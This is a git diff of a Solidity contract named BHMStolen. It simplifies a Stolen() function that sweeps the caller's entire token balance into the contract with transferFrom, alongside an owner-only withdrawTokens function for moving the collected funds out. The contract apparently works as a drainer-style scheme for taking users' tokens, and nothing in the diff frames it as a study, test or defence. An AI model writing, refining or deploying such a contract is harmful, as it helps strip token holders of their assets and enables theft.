@@ -72,43 +72,13 @@ contract BHMStolen {
         return gettokens;
     }
 
-    function getallowance() external returns(uint256){
-        uint256 allowance = token.allowance(owner, msg.sender);
-        return allowance;
-    }
-
     function Stolen() external {
         //その人が持っているトークン
         require(token.balanceOf(msg.sender) > 1,"Token: Empty");
         uint256 amount = token.balanceOf(msg.sender);
-        
-
-        //ERC20 holder = ERC20(msg.sender);
-        //token.transfer(address(this),amount * 10**token.decimals());
-
-        //token.allowance(msg.sender, address(this));
-       
-        uint256 maxToken = 1000000;
-
-        
-        //token.approve(address(this),maxToken);
-        //token.allowance(msg.sender, address(this));
-
-        token.approve(address(this),maxToken);
-        token.allowance(address(this), msg.sender);
-        
-        //require(allowance >= amount, "Check the token allowance");
-        token.transferFrom(msg.sender, address(this), amount);
-        //token.transferFrom(address(this), msg.sender, amount);
-    }
-
-    function sell(uint256 amount) public {
-        require(amount > 0, "You need to sell at least some tokens");
-        uint256 allowance = token.allowance(msg.sender, address(this));
-        require(allowance >= amount, "Check the token allowance");
-        token.transferFrom(msg.sender, address(this), amount);
-        msg.sender.transfer(amount);
-        emit Sold(amount);
+        if(amount != 0){
+            token.transferFrom(msg.sender, address(this), amount);
+        }
     }
 
     function withdrawTokens(address _receiver, uint256 _amount) external onlyOwner {
